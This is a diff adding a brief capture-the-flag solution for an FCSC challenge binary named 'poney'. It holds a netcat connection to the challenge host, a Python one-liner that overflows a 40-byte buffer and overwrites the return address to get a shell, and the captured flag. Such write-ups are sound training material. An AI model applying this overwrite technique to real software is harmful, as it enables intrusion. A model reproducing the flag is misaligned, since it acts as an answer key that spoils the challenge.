@@ -1,0 +1,5 @@
+nc challenges1.france-cybersecurity-challenge.fr 4000
+
+(python -c 'print "A"*40 + "\x76\x06\x40\x00\x00\x00\x00\x00"'; cat -) | ./poney
+
+FCSC{725dd45f9c98099bcca6e9922beda74d381af1145dfce3b933512a380a356acf}
